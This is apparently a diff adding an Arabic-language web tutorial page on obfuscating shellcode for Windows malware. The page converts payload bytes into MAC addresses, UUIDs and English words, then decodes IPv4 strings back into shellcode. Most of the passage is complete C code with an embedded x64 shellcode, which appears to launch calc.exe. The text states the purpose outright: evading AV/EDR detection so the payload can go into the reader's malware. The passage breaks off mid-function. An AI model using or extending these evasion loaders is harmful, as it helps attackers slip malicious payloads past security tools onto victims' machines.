+                            loading="lazy">
+                    </div>
+                    <li>وهنا لزوم التنظيم والشكل العام يكون لطيف ، وإن الفواصل تتحط بشكل صح وهكذا.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-MAC-4.png" alt="ShellcodeToMAC-4" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>آخر جزء ودا الشيل كود نفسة ، والـ Main Function .. وفيها شوية حاجات ينطبعوا وانها بتستدعي الداله
+                        نفسها .. والكلام دا إنت عرفته فـ الطُرق اللـ فوق مش محتاج أشرح.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-MAC-5.png" alt="ShellcodeToMAC-5" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>زي الفل ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-MAC-6.png" alt="ShellcodeToMAC-6" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] الكود النهائي :</p>
+                <div class="code-block"><code>
+                    #include &lt;Windows.h><br>
+                        #include &lt;stdio.h><br><br>
+                        
+                        #define MAC_BLOCK_SIZE 6  <br><br>
+                        
+                        BOOL ShellcodeToMAC(IN PBYTE pShellcode, IN SIZE_T ShellcodeSize) {<br>
+                            &nbsp;&nbsp;if (pShellcode == NULL || ShellcodeSize == 0) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;printf("char* MacArray[%d] = {\n\t", (int)(ShellcodeSize / MAC_BLOCK_SIZE));<br><br>
+                        
+                                &nbsp;&nbsp;int counter = 0;<br><br>
+                                &nbsp;&nbsp;for (int i = 0; i < ShellcodeSize; i += MAC_BLOCK_SIZE) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;counter++;<br><br>
+                        
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("\"%02X-%02X-%02X-%02X-%02X-%02X\"",<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pShellcode[i], pShellcode[i + 1], pShellcode[i + 2],<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5]);<br><br>
+                        
+                                    &nbsp;&nbsp;&nbsp;&nbsp;if (i + MAC_BLOCK_SIZE >= ShellcodeSize) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n");<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;else {<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(", ");<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+                        
+                                            &nbsp;&nbsp;&nbsp;&nbsp;if (counter % 4 == 0) {  <br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n\t");<br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                                &nbsp;&nbsp;}<br><br>
+                        
+                                                &nbsp;&nbsp;printf("};\n\n");<br><br>
+                        
+                                                &nbsp;&nbsp;return TRUE;<br>
+                        }<br>
+                        
+                        unsigned char shellcode[] =<br>
+                        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br><br>
+                        
+                        int main() {<br>
+                            &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Convert ShellCode to MAC Addresses...\n\n");<br>
+                            &nbsp;&nbsp;getchar();<br><br>
+                        
+                            &nbsp;&nbsp;if (!ShellcodeToMAC(shellcode, sizeof(shellcode) - 1)) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit...\n");<br>
+                                &nbsp;&nbsp;getchar();<br><br>
+                        
+                                &nbsp;&nbsp;return 0;<br>
+                        }<br>
+                        
+                </code></div>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">1.4 Shellcode to UUIDs :</h3>
+                <p>[+] هنتكلم عن تكنيك تاني وهو Shellcode to UUIDs ، والـ UUID أو الـ Universally Unique Identifier هو
+                    رقم فريد عالميا بيتكون من 16 بايت وبيتكتب فـ صيغة Hexadecimal بالشكل ده: </p>
+                <div class="code-block"><code>550e8400-e29b-41d4-a716-446655440000</code></div>
+                <p>[+] والهدف من استخدام UUIDs هو إخفاء الشيل كود فـ شكل بيانات شرعية ، لإن UUIDs بتستخدم فـ تطبيقات
+                    كتير زي تحديد الأجهزة ، إدارة البيانات ، والـ COM Objects ، فده بيقلل من احتمالية كشفها من برامج الـ
+                    AV / EDR .. يلا نشوف الكود :</p>
+                <Ol>
+                    <li>الـ Rpc.h والـ Rpcrt4.lib بيتم استخدامهم لتحويل البيانات لـ UUID. </li>
+                    <div class="code-block"><code>#pragma comment(lib, "Rpcrt4.lib") </code></div>
+                    بتضيف مكتبة Rpcrt4.lib وقت الـ Linking، ودي مكتبة مسؤولة عن التعامل مع UUIDs.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-UUID-1.png" alt="ShellcodeToUUID-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>باقي الأجزاء دي سهلة بالنسبالك لأنها تكرار لنفس الأكواد للطُرق اللـ فوق :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-UUID-2.png" alt="ShellcodeToUUID-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>الشيل كود والـ main :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-UUID-3.png" alt="ShellcodeToUUID-3" class="article-image"
+                            loading="lazy">
+                    </div>
+                </Ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>تمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-UUID-4.png" alt="ShellcodeToUUID-4" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] الكود النهائي :</p>
+                <div class="code-block"><code>#include &lt;Windows.h><br>
+                    #include &lt;stdio.h><br>
+                    #include &lt;Rpc.h><br><br>
+                    
+                    #pragma comment(lib, "Rpcrt4.lib")<br><br>
+                    
+                    #pragma warning(disable:4996)<br><br>
+                    
+                    #define UUID_BLOCK_SIZE 16<br><br>
+                    
+                    BOOL ShellcodeToUUID(IN PBYTE pShellcode, IN SIZE_T ShellcodeSize) {<br>
+                        &nbsp;&nbsp;if (pShellcode == NULL || ShellcodeSize == 0) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                            &nbsp;&nbsp;}<br><br>
+                    
+                            &nbsp;&nbsp;printf("char* UuidArray[%d] = {\n\t", (int)(ShellcodeSize / UUID_BLOCK_SIZE));<br><br>
+                    
+                            &nbsp;&nbsp;int counter = 0;<br><br>
+                    
+                            &nbsp;&nbsp;for (int i = 0; i < ShellcodeSize; i += UUID_BLOCK_SIZE) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;counter++;<br><br>
+                    
+                            &nbsp;&nbsp;&nbsp;&nbsp;UUID uuid;<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;memcpy(&uuid, pShellcode + i, UUID_BLOCK_SIZE);<br><br>
+                    
+                            &nbsp;&nbsp;&nbsp;&nbsp;RPC_CSTR uuidString;<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;if (UuidToStringA(&uuid, &uuidString) != RPC_S_OK) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[!] UuidToStringA Failed at block %d\n", counter);<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+                    
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("\"%s\"", uuidString);<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;RpcStringFreeA(&uuidString);<br><br>
+                    
+                            &nbsp;&nbsp;&nbsp;&nbsp;if (i + UUID_BLOCK_SIZE >= ShellcodeSize) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n");<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;else {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(", ");<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+                    
+                            &nbsp;&nbsp;&nbsp;&nbsp;if (counter % 2 == 0) {  <br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n\t");<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;}<br>
+                    
+                        &nbsp;&nbsp;printf("};\n\n");<br><br>
+                    
+                        &nbsp;&nbsp;return TRUE;<br>
+                    }<br>
+                    
+                    unsigned char shellcode[] =<br>
+                    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br><br>
+                    
+                    int main() {<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Convert ShellCode to UUIDs...\n\n");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                    
+                        &nbsp;&nbsp;if (!ShellcodeToUUID(shellcode, sizeof(shellcode) - 1)) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                            &nbsp;&nbsp;}<br><br>
+                    
+                            &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit...\n");<br>
+                            &nbsp;&nbsp;getchar();<br><br>
+                    
+                            &nbsp;&nbsp;return 0;<br>
+                    }</code></div>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">1.5 ShellCode to Words :</h3>
+                <p>[+] دلوقتي هنتكلم عن آخر تكنيك .. هنحول الشيل كود لـ كلمات إنجليزية عادية ، بحيث يبان كأنه نص عشوائي
+                    لكنه شرعي.</p>
+                <p>[+] فكرته إن بدل مـ نخزن الشيل كود فـ صورة Hex أو Binary ، بنعمل Mapping لكل Byte لـ كلمة إنجليزية ،
+                    فـ الشيل كود بيتحول لمصفوفة من الكلمات ، وده بيقلل الشكوك بشكل كبير.</p>
+                <p>[+] تعالي نشوف أهم الأجزاء فـ الكود ، لإن زي مقولتلك هو تكرار لنفس الأكواد اللـ فوق مع شوية تعديلات :
+                </p>
+                <ol>
+                    <li>أول جزء ودا الـ Dectionary بتاعنا اللـ هيستبدل منه البايتس فـ الشيل كود بالكلمات دي :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Words-1.png" alt="ShellcodeToWords-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>وهنا دي الفانكشن اللـ هتعدي ع كل بايت من الشيل كود وتحولة لـ كلمة من الديكشيناري :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Words-2.png" alt="ShellcodeToWords-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>الشيل كود والـ main.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Words-3.png" alt="ShellcodeToWords-3" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>تمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-Words-4.png" alt="ShellcodeToWords-4" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] الكود النهائي :</p>
+                <div class="code-block"><code>#include &lt;Windows.h><br>
+                    #include &lt;stdio.h><br><br>
+                    
+                    #pragma warning (disable:4996)<br><br>
+                    
+                    const char* translation_table[256] = {<br>
+                        "music","taste","wings","audio","endif","winds","crime","bonus","lanka","honey","simon","manor","screw","puppy","surge","watts",<br>
+                        "upper","dance","touch","heavy","tumor","scale","acute","wider","strap","tooth","colon","karen","fever","quiet","chart","donna",<br>
+                        "yacht","human","devil","belly","heath","class","shall","these","funds","discs","atlas","dying","arrow","spies","pairs","young",<br>
+                        "amber","exist","glory","offer","swift","focal","larry","bobby","tires","items","skirt","adult","blond","roman","stick","elvis",<br>
+                        "slope","scuba","value","lexus","cells","happy","joins","india","yards","smoke","train","bacon","sheet","blink","dairy","latex",<br>
+                        "feels","guide","shoot","holly","armor","bench","tours","cedar","fires","bands","firms","roads","known","going","mails","speak",<br>
+                        "laugh","heard","study","logan","packs","level","carey","shirt","loose","tapes","goals","maine","uncle","shine","dense","cases",<br>
+                        "cache","cards","favor","disks","coins","nokia","enter","fatty","bring","anger","singh","tribe","notre","saint","emily","moses",<br>
+                        "brown","kathy","busty","squad","gamma","debug","nikon","judge","guest","claim","lobby","bears","maybe","close","basic","catch",<br>
+                        "alarm","meant","chain","meyer","vital","clock","keith","ports","theme","enjoy","abuse","rooms","pipes","broad","words","outer",<br>
+                        "point","users","paste","aruba","hairy","spice","taxes","teach","paris","plate","roger","title","stone","gates","texts","smart",<br>
+                        "trade","berry","worry","photo","tunes","storm","panic","pumps","hello","fuzzy","mouth","joyce","grows","email","teddy","pills",<br>
+                        "birth","games","pride","skype","meter","yours","lyric","means","picks","diane","wagon","rouge","kevin","focus","scott","dolls",<br>
+                        "frost","today","small","alpha","track","smith","james","wanna","buses","spots","eight","stuck","indie","clean","weeks","jewel",<br>
+                        "solve","opens","civic","usage","array","nodes","mason","roots","sugar","dirty","sight","jesus","lloyd","strip","dream","might",<br>
+                        "tions","grams","brass","hired","julia","crazy","flood","march","combo","drops","delta","shaft","spank","jesse","arena","visit"<br>
+                    };<br><br>
+                    
+                    BOOL ShellcodeToWordsOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {<br>
+                        &nbsp;&nbsp;if (pShellcode == NULL || ShellcodeSize == 0) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                            &nbsp;&nbsp;}<br><br>
+                    
+                            &nbsp;&nbsp;printf("unsigned char* translated_shellcode[%d] = {\n\t", (int)(ShellcodeSize));<br><br>
+                    
+                            &nbsp;&nbsp;for (int i = 0; i < ShellcodeSize; i++) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("\"%s\"%s", translation_table[pShellcode[i] % 256], (i == ShellcodeSize - 1) ? "" : ", ");<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;if ((i + 1) % 8 == 0) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n\t");<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                    &nbsp;&nbsp;}<br><br>
+                    
+                                    &nbsp;&nbsp;printf("\n};\n\n");<br>
+                                    &nbsp;&nbsp;return TRUE;<br>
+                    }<br>
+                    
+                    unsigned char shellcode[] =<br>
+                    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br><br>
+                    
+                    int main() {<br>
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Convert ShellCode to Words...\n\n");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                        &nbsp;&nbsp;if (!ShellcodeToWordsOutput(shellcode, sizeof(shellcode) - 1)) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                            &nbsp;&nbsp;}<br><br>
+                            &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit...\n");<br>
+                            &nbsp;&nbsp;getchar();<br><br>
+                            &nbsp;&nbsp;return 0;<br>
+                    }<br></code></div>
+                <br>
+                <h2 style="direction: ltr;">2. Deobfuscation :</h2>
+                <p>[+] بعد مـ عرفت 5 طرق مختلفة لـ Obfuscation .. وطبعا مش مستنيني أقولك إنك تقدر تعمل أي حاجه تانيه
+                    ودول ما هم إلا مجرد بديلك أمثله ، وما بعد ذلك إنت ودماغك .. دلوقتي هنحتاج نرجع اللـ عملناه ده لـ شيل
+                    كود تاني عشان نقدر نضيفة جوا الـ Malware اللـ إحنا بنعملة.</p>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">2.1 IPv4 to Shellcode :</h3>
+                <p>[+] هنا هنعكس اللـ عملناه فوق ، ونرجع الـ IPv4 لـ شيل كود : </p>
+                <ol>
+                    <li>هنا دي عناوين الـ IPv4 اللـ طلعناهم من الـ Obfuscation.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-IPv4-1.png" alt="IPv4ToShellcode-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>هنا دا تعريف دالة API من مكتبة NTDLL وهي RtlIpv4StringToAddressA ، ودي بتُستخدم عشان تحول عناوين
+                        الـ IP وترجعة للشيل كود.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-IPv4-2.png" alt="IPv4ToShellcode-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li> الدالة المسؤولة عن فك التشفير <code
+                            style="background: #16ff00; font-size: 14px;">Ipv4Deobfuscation</code></li>
+                    <li>بتعمل تحميل للـ Address بتاع دالة <code
+                            style="background: #16ff00; font-size: 14px;">RtlIpv4StringToAddressA</code> من NTDLL
+                        باستخدام <code style="background: #16ff00; font-size: 14px;">GetProcAddress</code>.</li>
+                    <li>بتحجز مكان فـ الميموري بحجم NumberOfElements × 4 بايت (لأن كل IP يحمل 4 بايت).</li>
+                    <li>هنا بتعدي ع كل عنوان IP وتباصيه للدالة <code
+                            style="background: #16ff00; font-size: 14px;">RtlIpv4StringToAddressA</code> ، وهي بتحولة لـ
+                        4 بايتس ، وبتتخزن
+                        فـ pBuffer.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-IPv4-3.png" alt="IPv4ToShellcode-3" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>ودي كدا الـ main :</lip>
+                        <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                            <img src="../src/Pics/Deobfs-IPv4-4.png" alt="IPv4ToShellcode-4" class="article-image"
+                                loading="lazy">
+                        </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>تمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-IPv4-5.png" alt="IPv4ToShellcode-5" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] الكود النهائي :</p>
+                <div class="code-block"><code>#include &lt;Windows.h><br>
+                    #include &lt;stdio.h><br><br>
+                    char* Ipv4Array[] = {<br>
+                        &nbsp;&nbsp;"252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82",<br>
+                        &nbsp;&nbsp;"32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237",<br>
+                        &nbsp;&nbsp;"82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68",<br>
+                        &nbsp;&nbsp;"139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193",<br>
+                        &nbsp;&nbsp;"56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73",<br>
+                        &nbsp;&nbsp;"1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65",<br>
+                        &nbsp;&nbsp;"89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139",<br>
+                        &nbsp;&nbsp;"111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71",<br>
+                        &nbsp;&nbsp;"19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.46", "101.120.101.0"<br>
+                };<br><br>
+                
+                #define NumberOfElements 69<br><br>
+                
+                
+                typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(<br>
+                &nbsp;&nbsp;PCSTR                   S,<br>
+                &nbsp;&nbsp;BOOLEAN                 Strict,<br>
+                &nbsp;&nbsp;PCSTR* Terminator,<br>
+                &nbsp;&nbsp;PVOID                   Addr<br>
+                &nbsp;&nbsp;);<br><br>
+                
+                
+                BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {<br>
+                
+                    &nbsp;&nbsp;PBYTE           pBuffer = NULL,<br>
+                    &nbsp;&nbsp;TmpBuffer = NULL;<br><br>
+                
+                    &nbsp;&nbsp;SIZE_T          sBuffSize = NULL;<br><br>
+                
+                    &nbsp;&nbsp;PCSTR           Terminator = NULL;<br><br>
+                
+                    &nbsp;&nbsp;NTSTATUS        STATUS = NULL;<br><br>
+                
+                    &nbsp;&nbsp;fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");<br>
+                    &nbsp;&nbsp;if (pRtlIpv4StringToAddressA == NULL) {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                        &nbsp;&nbsp;}<br><br>
+                
+                        &nbsp;&nbsp;sBuffSize = NmbrOfElements * 4;<br><br>
+                
+                        &nbsp;&nbsp;pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);<br>
+                        &nbsp;&nbsp;if (pBuffer == NULL) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                            &nbsp;&nbsp;}<br>
+                
+                            &nbsp;&nbsp;TmpBuffer = pBuffer;<br><br>
+                
+                
+                
+                            &nbsp;&nbsp;for (int i = 0; i < NmbrOfElements; i++) {<br><br>
